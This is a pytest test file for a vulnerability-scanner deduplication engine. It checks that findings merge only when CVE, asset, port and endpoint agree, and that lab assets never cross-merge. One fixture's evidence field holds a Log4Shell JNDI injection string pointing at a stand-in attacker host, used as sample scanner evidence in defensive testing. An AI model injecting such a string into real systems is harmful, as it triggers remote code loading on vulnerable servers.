"""
test_m2_deduplication.py
========================
Focused test suite for RizIntel Issue #2: Cross-Asset Deduplication Semantics.

Tests:
1. Same CVE + same asset + same endpoint => merge
2. Same CVE + different assets => MUST NOT merge
3. Same CVE + same asset + different ports => separate (different service instances)
4. Same CVE + same asset + clearly different endpoints => separate
5. Different CVEs on same asset => no incorrect merge
6. UNMAPPED host A vs UNMAPPED host B => MUST NOT merge
7. UNMAPPED same host:port + matching vulnerability => merges as legitimate correlation
8. Multi-scanner same-asset correlation works across ZAP/Nuclei/OpenVAS
9. Full source finding IDs and provenance are strictly preserved
10. Live WebGoat vs Juice Shop real scanner datasets never cross-merge assets
"""

import json
from pathlib import Path
import pytest

from mem2.src.models import NormalizedFinding
from mem2.src.deduplicator import Deduplicator
from mem2.src.matcher import VulnerabilityMatcher
from mem2.src.fingerprint import generate_fingerprint, generate_cve_fingerprint
from services.pipeline_service import UnifiedPipelineRunner, DEFAULT_ASSET_CATALOG

_BACKEND_DIR = Path(__file__).resolve().parent.parent


# =============================================================================
# 1. Exact Match & Hard Asset Boundary Tests
# =============================================================================

def test_same_cve_same_asset_same_endpoint_merges():
    """
    Two findings from different scanners reporting the SAME CVE on the SAME asset
    and SAME endpoint must be recognized as duplicates and merged.
    """
    f1 = NormalizedFinding(
        finding_id="ZAP-001",
        scanner="ZAP",
        cve_id="CVE-2024-1234",
        vulnerability_name="SQL Injection",
        vulnerability_type="SQL_INJECTION",
        severity="HIGH",
        asset_id="ASSET-WEB-001",
        host="payments.internal.corp",
        url="https://payments.internal.corp/api/v1/pay",
        endpoint="/api/v1/pay",
        port=443,
        parameter="account_id",
        description="SQL injection vulnerability detected in payment gateway",
        timestamp="2026-08-20T10:00:00Z"
    )
    f2 = NormalizedFinding(
        finding_id="NUCLEI-001",
        scanner="NUCLEI",
        cve_id="CVE-2024-1234",
        vulnerability_name="Blind SQLi vulnerability",
        vulnerability_type="SQL_INJECTION",
        severity="HIGH",
        asset_id="ASSET-WEB-001",
        host="payments.internal.corp",
        url="https://payments.internal.corp/api/v1/pay",
        endpoint="/api/v1/pay",
        port=443,
        parameter="account_id",
        description="Time-based blind SQLi confirmed",
        timestamp="2026-08-20T10:05:00Z"
    )

    matcher = VulnerabilityMatcher(similarity_threshold=0.60)
    is_match, score = matcher.exact_match(f1, f2)
    assert is_match is True
    assert score == 1.0

    deduplicator = Deduplicator()
    result = deduplicator.deduplicate([f1, f2])
    assert len(result["findings"]) == 1
    deduped = result["findings"][0]
    assert deduped["cve_id"] == "CVE-2024-1234"
    assert deduped["asset"]["asset_id"] == "ASSET-WEB-001"
    assert set(deduped["deduplication"]["merged_finding_ids"]) == {"ZAP-001", "NUCLEI-001"}
    assert deduped["scanner_consensus"]["detected_by_count"] == 2


def test_same_cve_different_assets_must_not_merge():
    """
    CRITICAL ISSUE #2 REQUIREMENT:
    The same CVE present on Asset A (ASSET-WEB-001) and Asset B (ASSET-PAY-001)
    MUST NOT be merged into a single finding.
    They represent two separate remediation instances with different owners,
    SLAs, and criticality.
    """
    f1 = NormalizedFinding(
        finding_id="ZAP-001",
        scanner="ZAP",
        cve_id="CVE-2024-1234",
        vulnerability_name="SQL Injection",
        vulnerability_type="SQL_INJECTION",
        severity="HIGH",
        asset_id="ASSET-WEB-001",
        host="payments.internal.corp",
        url="https://payments.internal.corp/login",
        endpoint="/login",
        port=443,
        parameter="username",
        description="SQL injection in payments web frontend",
        timestamp="2026-08-20T10:00:00Z"
    )
    f2 = NormalizedFinding(
        finding_id="NUCLEI-002",
        scanner="NUCLEI",
        cve_id="CVE-2024-1234",
        vulnerability_name="SQL Injection",
        vulnerability_type="SQL_INJECTION",
        severity="HIGH",
        asset_id="ASSET-PAY-001",
        host="pay.internal.corp",
        url="https://pay.internal.corp/login",
        endpoint="/login",
        port=443,
        parameter="username",
        description="SQL injection in payment gateway backend",
        timestamp="2026-08-20T10:02:00Z"
    )

    matcher = VulnerabilityMatcher(similarity_threshold=0.60)
    is_match, score = matcher.exact_match(f1, f2)
    assert is_match is False
    assert score == 0.0

    is_hybrid, hybrid_score, _ = matcher.hybrid_match(f1, f2)
    assert is_hybrid is False
    assert hybrid_score == 0.0

    # Fingerprints must be distinct
    fp1 = generate_fingerprint(f1)
    fp2 = generate_fingerprint(f2)
    assert fp1 != fp2

    # CVE fingerprints must be distinct
    cve_fp1 = generate_cve_fingerprint(f1)
    cve_fp2 = generate_cve_fingerprint(f2)
    assert cve_fp1 != cve_fp2

    # Deduplicator engine must output 2 distinct findings
    deduplicator = Deduplicator()
    result = deduplicator.deduplicate([f1, f2])
    assert len(result["findings"]) == 2
    asset_ids = {f["asset"]["asset_id"] for f in result["findings"]}
    assert asset_ids == {"ASSET-WEB-001", "ASSET-PAY-001"}
    assert result["deduplication_metrics"]["duplicates_removed"] == 0


def test_same_cve_same_asset_different_ports_separate_service_instance():
    """
    Same CVE on the same asset host, but on different ports (e.g. port 8080 vs 9090).
    Represents distinct running service instances and must NOT merge.
    """
    f1 = NormalizedFinding(
        finding_id="ZAP-PORT-8080",
        scanner="ZAP",
        cve_id="CVE-2023-44487",
        vulnerability_name="HTTP/2 Rapid Reset Attack",
        vulnerability_type="DENIAL_OF_SERVICE",
        severity="HIGH",
        asset_id="ASSET-WEB-001",
        host="payments.internal.corp",
        url="http://payments.internal.corp:8080/",
        endpoint="/",
        port=8080,
        parameter=None,
        description="HTTP/2 Rapid Reset on API gateway listener",
        timestamp="2026-08-20T10:00:00Z"
    )
    f2 = NormalizedFinding(
        finding_id="NUCLEI-PORT-9090",
        scanner="NUCLEI",
        cve_id="CVE-2023-44487",
        vulnerability_name="HTTP/2 Rapid Reset Attack",
        vulnerability_type="DENIAL_OF_SERVICE",
        severity="HIGH",
        asset_id="ASSET-WEB-001",
        host="payments.internal.corp",
        url="http://payments.internal.corp:9090/",
        endpoint="/",
        port=9090,
        parameter=None,
        description="HTTP/2 Rapid Reset on Admin management listener",
        timestamp="2026-08-20T10:05:00Z"
    )

    matcher = VulnerabilityMatcher()
    is_match, _ = matcher.exact_match(f1, f2)
    assert is_match is False

    deduplicator = Deduplicator()
    result = deduplicator.deduplicate([f1, f2])
    assert len(result["findings"]) == 2
    ports = {f["asset"]["port"] for f in result["findings"]}
    assert ports == {8080, 9090}


def test_same_cve_same_asset_distinct_endpoints_remain_separate():
    """
    Same CVE on the same asset and port, but distinctly different vulnerable endpoints
    (e.g., /api/v1/auth vs /admin/backup/download).
    Represents distinct vulnerable code paths and must remain separate findings.
    """
    f1 = NormalizedFinding(
        finding_id="ZAP-EP1",
        scanner="ZAP",
        cve_id="CVE-2024-5555",
        vulnerability_name="Path Traversal",
        vulnerability_type="PATH_TRAVERSAL",
        severity="HIGH",
        asset_id="ASSET-DEV-003",
        host="staging.internal.corp",
        url="https://staging.internal.corp/api/v1/auth",
        endpoint="/api/v1/auth",
        port=443,
        parameter="redirect",
        description="Path traversal in auth redirect",
        timestamp="2026-08-20T10:00:00Z"
    )
    f2 = NormalizedFinding(
        finding_id="NUCLEI-EP2",
        scanner="NUCLEI",
        cve_id="CVE-2024-5555",
        vulnerability_name="Path Traversal",
        vulnerability_type="PATH_TRAVERSAL",
        severity="HIGH",
        asset_id="ASSET-DEV-003",
        host="staging.internal.corp",
        url="https://staging.internal.corp/admin/backup/download",
        endpoint="/admin/backup/download",
        port=443,
        parameter="file",
        description="Path traversal in backup download handler",
        timestamp="2026-08-20T10:02:00Z"
    )

    matcher = VulnerabilityMatcher()
    is_match, _ = matcher.exact_match(f1, f2)
    assert is_match is False

    deduplicator = Deduplicator()
    result = deduplicator.deduplicate([f1, f2])
    assert len(result["findings"]) == 2


def test_different_cves_on_same_asset_never_merge():
    """
    Two completely different vulnerabilities (different CVEs) on the same asset
    must never be merged.
    """
    f1 = NormalizedFinding(
        finding_id="ZAP-CVE-1",
        scanner="ZAP",
        cve_id="CVE-2024-1111",
        vulnerability_name="SQL Injection",
        vulnerability_type="SQL_INJECTION",
        severity="HIGH",
        asset_id="ASSET-WEB-001",
        host="payments.internal.corp",
        url="https://payments.internal.corp/api/v1",
        endpoint="/api/v1",
        port=443,
        parameter="id",
        description="SQL injection",
        timestamp="2026-08-20T10:00:00Z"
    )
    f2 = NormalizedFinding(
        finding_id="NUCLEI-CVE-2",
        scanner="NUCLEI",
        cve_id="CVE-2024-9999",
        vulnerability_name="Cross-Site Scripting",
        vulnerability_type="CROSS_SITE_SCRIPTING",
        severity="MEDIUM",
        asset_id="ASSET-WEB-001",
        host="payments.internal.corp",
        url="https://payments.internal.corp/api/v1",
        endpoint="/api/v1",
        port=443,
        parameter="name",
        description="Reflected XSS",
        timestamp="2026-08-20T10:05:00Z"
    )

    matcher = VulnerabilityMatcher()
    is_exact, _ = matcher.exact_match(f1, f2)
    is_fuzzy, _, _ = matcher.fuzzy_match(f1, f2)
    is_hybrid, _, _ = matcher.hybrid_match(f1, f2)
    assert is_exact is False
    assert is_fuzzy is False
    assert is_hybrid is False


# =============================================================================
# 2. UNMAPPED Asset Isolation & Instance Boundary Tests
# =============================================================================

def test_unmapped_host_a_vs_unmapped_host_b_never_merge():
    """
    Two findings on UNMAPPED assets with DIFFERENT unknown hosts/ports
    (e.g., evil-host.net:8080 vs rogue-server.org:9090)
    MUST NOT be merged even if they report identical vulnerability name and CVE.
    """
    f1 = NormalizedFinding(
        finding_id="ZAP-UNK-1",
        scanner="ZAP",
        cve_id="CVE-2024-8888",
        vulnerability_name="Remote Code Execution",
        vulnerability_type="REMOTE_CODE_EXECUTION",
        severity="CRITICAL",
        asset_id="UNMAPPED",
        host="evil-host.net",
        url="http://evil-host.net:8080/eval",
        endpoint="/eval",
        port=8080,
        parameter="code",
        description="RCE vulnerability",
        timestamp="2026-08-20T10:00:00Z"
    )
    f2 = NormalizedFinding(
        finding_id="NUCLEI-UNK-2",
        scanner="NUCLEI",
        cve_id="CVE-2024-8888",
        vulnerability_name="Remote Code Execution",
        vulnerability_type="REMOTE_CODE_EXECUTION",
        severity="CRITICAL",
        asset_id="UNMAPPED",
        host="rogue-server.org",
        url="http://rogue-server.org:9090/eval",
        endpoint="/eval",
        port=9090,
        parameter="code",
        description="RCE vulnerability",
        timestamp="2026-08-20T10:05:00Z"
    )

    matcher = VulnerabilityMatcher()
    is_match, _ = matcher.exact_match(f1, f2)
    assert is_match is False

    is_hybrid, _, _ = matcher.hybrid_match(f1, f2)
    assert is_hybrid is False

    deduplicator = Deduplicator()
    result = deduplicator.deduplicate([f1, f2])
    assert len(result["findings"]) == 2
    assert result["deduplication_metrics"]["duplicates_removed"] == 0


def test_unmapped_same_host_matching_vuln_merges():
    """
    Two scanners detecting the SAME vulnerability on the SAME UNMAPPED host:port
    (e.g., 192.168.1.50:8080) SHOULD merge as legitimate cross-scanner correlation.
    """
    f1 = NormalizedFinding(
        finding_id="ZAP-UNK-A1",
        scanner="ZAP",
        cve_id="CVE-2024-8888",
        vulnerability_name="Remote Code Execution",
        vulnerability_type="REMOTE_CODE_EXECUTION",
        severity="CRITICAL",
        asset_id="UNMAPPED",
        host="192.168.1.50",
        url="http://192.168.1.50:8080/eval",
        endpoint="/eval",
        port=8080,
        parameter="code",
        description="RCE vulnerability from ZAP",
        timestamp="2026-08-20T10:00:00Z"
    )
    f2 = NormalizedFinding(
        finding_id="NUCLEI-UNK-A2",
        scanner="NUCLEI",
        cve_id="CVE-2024-8888",
        vulnerability_name="Remote Code Execution Exploit",
        vulnerability_type="REMOTE_CODE_EXECUTION",
        severity="CRITICAL",
        asset_id="UNMAPPED",
        host="192.168.1.50",
        url="http://192.168.1.50:8080/eval",
        endpoint="/eval",
        port=8080,
        parameter="code",
        description="RCE vulnerability from Nuclei",
        timestamp="2026-08-20T10:05:00Z"
    )

    matcher = VulnerabilityMatcher()
    is_match, score = matcher.exact_match(f1, f2)
    assert is_match is True
    assert score == 1.0

    deduplicator = Deduplicator()
    result = deduplicator.deduplicate([f1, f2])
    assert len(result["findings"]) == 1
    deduped = result["findings"][0]
    assert deduped["asset"]["asset_id"] == "UNMAPPED"
    assert deduped["asset"]["host"] == "192.168.1.50"
    assert set(deduped["deduplication"]["merged_finding_ids"]) == {"ZAP-UNK-A1", "NUCLEI-UNK-A2"}


# =============================================================================
# 3. Multi-Scanner Same-Asset Correlation & Provenance
# =============================================================================

def test_multi_scanner_same_asset_correlation_preserves_provenance():
    """
    Verify that 3 scanners (ZAP, NUCLEI, OPENVAS) detecting the same vulnerability
    on the same asset correlate into 1 canonical finding while preserving all 3 source finding IDs.
    """
    f1 = NormalizedFinding(
        finding_id="FIND-ZAP-01",
        scanner="ZAP",
        cve_id="CVE-2021-44228",
        vulnerability_name="Log4j Remote Code Execution",
        vulnerability_type="REMOTE_CODE_EXECUTION",
        severity="CRITICAL",
        asset_id="ASSET-WEB-001",
        host="payments.internal.corp",
        url="https://payments.internal.corp/api/login",
        endpoint="/api/login",
        port=443,
        parameter="X-Api-Version",
        description="Log4Shell vulnerability in header parsing",
        evidence="${jndi:ldap://evil.corp/a}",
        timestamp="2026-08-20T08:00:00Z"
    )
    f2 = NormalizedFinding(
        finding_id="FIND-NUCLEI-02",
        scanner="NUCLEI",
        cve_id="CVE-2021-44228",
        vulnerability_name="Apache Log4j RCE (Log4Shell)",
        vulnerability_type="REMOTE_CODE_EXECUTION",
        severity="CRITICAL",
        asset_id="ASSET-WEB-001",
        host="payments.internal.corp",
        url="https://payments.internal.corp/api/login",
        endpoint="/api/login",
        port=443,
        parameter="X-Api-Version",
        description="Confirmed Log4Shell JNDI injection",
        evidence="DNS callback received",
        timestamp="2026-08-20T08:05:00Z"
    )
    f3 = NormalizedFinding(
        finding_id="FIND-OPENVAS-03",
        scanner="OPENVAS",
        cve_id="CVE-2021-44228",
        vulnerability_name="Apache Log4j Security Vulnerability",
        vulnerability_type="REMOTE_CODE_EXECUTION",
        severity="CRITICAL",
        asset_id="ASSET-WEB-001",
        host="payments.internal.corp",
        url="https://payments.internal.corp/api/login",
        endpoint="/api/login",
        port=443,
        parameter=None,
        description="OpenVAS detected vulnerable Log4j artifact",
        evidence="Log4j-core-2.14.1.jar in classpath",
        timestamp="2026-08-20T08:10:00Z"
    )

    deduplicator = Deduplicator()
    result = deduplicator.deduplicate([f1, f2, f3])
    assert len(result["findings"]) == 1

    deduped = result["findings"][0]
    assert deduped["cve_id"] == "CVE-2021-44228"
    assert deduped["asset"]["asset_id"] == "ASSET-WEB-001"
    assert deduped["scanner_consensus"]["detected_by_count"] == 3
    assert deduped["scanner_consensus"]["score"] == 1.0

    # Provenance check: all 3 source finding IDs and evidence preserved
    merged_ids = deduped["deduplication"]["merged_finding_ids"]
    assert set(merged_ids) == {"FIND-ZAP-01", "FIND-NUCLEI-02", "FIND-OPENVAS-03"}

    source_findings = deduped["source_findings"]
    assert len(source_findings) == 3
    scanners_in_sources = {sf["scanner"] for sf in source_findings}
    assert scanners_in_sources == {"ZAP", "NUCLEI", "OPENVAS"}


# =============================================================================
# 4. Live E2E Pipeline Verification — WebGoat & Juice Shop Never Cross-Merge
# =============================================================================

def test_e2e_pipeline_webgoat_and_juiceshop_never_cross_merge():
    """
    End-to-End Test: Run live raw scanner payloads for both WebGoat (port 8001)
    and Juice Shop (port 3000) through M1 -> M8 pipeline.
    Verify:
    1. WebGoat findings only resolve to ASSET-LAB-WEBGOAT.
    2. Juice Shop findings only resolve to ASSET-LAB-JUICESHOP.
    3. No findings are cross-merged across the two distinct lab assets.
    """
    webgoat_zap_path = _BACKEND_DIR / "mem1" / "webgoat" / "zap_webgoat_report.json"
    juiceshop_wapiti_path = _BACKEND_DIR / "mem1" / "juice_shop" / "wapiti_juice_shop_report.json"

    if webgoat_zap_path.exists() and juiceshop_wapiti_path.exists():
        with open(webgoat_zap_path) as f:
            webgoat_raw = f.read()
        with open(juiceshop_wapiti_path) as f:
            juiceshop_raw = f.read()
        raw_sources = {
            "ZAP": webgoat_raw,
            "WAPITI": juiceshop_raw
        }
    else:
        webgoat_raw = json.dumps({
            "site": [{
                "@name": "http://127.0.0.1:8001",
                "@host": "127.0.0.1",
                "@port": "8001",
                "alerts": [
                    {
                        "name": "SQL Injection in WebGoat Lesson",
                        "riskcode": "3",
                        "desc": "SQL injection in WebGoat challenge",
                        "cweid": "89",
                        "instances": [{"uri": "http://127.0.0.1:8001/WebGoat/SqlInjection"}]
                    },
                    {
                        "name": "Cross Site Scripting in WebGoat Lesson",
                        "riskcode": "2",
                        "desc": "XSS in WebGoat challenge",
                        "cweid": "79",
                        "instances": [{"uri": "http://127.0.0.1:8001/WebGoat/CrossSiteScripting"}]
                    }
                ]
            }]
        })
        juiceshop_raw = json.dumps({
            "infos": {"target": "http://localhost:3000", "date": "Thu, 20 Aug 2026 14:35:14 +0000"},
            "classifications": {
                "SQL Injection": {"desc": "SQL Injection vulnerability", "sol": "Fix", "ref": {}},
                "Cross Site Scripting": {"desc": "XSS vulnerability", "sol": "Fix", "ref": {}}
            },
            "vulnerabilities": {
                "SQL Injection": [
                    {"method": "GET", "path": "/rest/products/search", "info": "param q", "level": 3, "parameter": "q"}
                ],
                "Cross Site Scripting": [
                    {"method": "POST", "path": "/#/feedback", "info": "feedback", "level": 2, "parameter": "comment"}
                ]
            }
        })
        raw_sources = {
            "ZAP": webgoat_raw,
            "WAPITI": juiceshop_raw
        }

    runner = UnifiedPipelineRunner()

    # Run combined pipeline with both scanner inputs
    findings, summary = runner.execute_pipeline(
        raw_sources=raw_sources,
        asset_catalog=DEFAULT_ASSET_CATALOG
    )

    assert len(findings) > 0

    wg_findings = [f for f in findings if f.asset_id == "ASSET-LAB-WEBGOAT"]
    js_findings = [f for f in findings if f.asset_id == "ASSET-LAB-JUICESHOP"]

    assert len(wg_findings) > 0, "WebGoat findings must exist"
    assert len(js_findings) > 0, "Juice Shop findings must exist"

    # Strict separation check: no WebGoat finding has Juice Shop asset context or vice versa
    for f in wg_findings:
        assert f.asset_id == "ASSET-LAB-WEBGOAT"
        assert f.detail.asset_context.asset_name == "WebGoat Vulnerable Lab"

    for f in js_findings:
        assert f.asset_id == "ASSET-LAB-JUICESHOP"
        assert f.detail.asset_context.asset_name == "OWASP Juice Shop Lab"

    # Verify that the total findings is strictly equal to wg_findings + js_findings
    assert len(findings) == len(wg_findings) + len(js_findings)
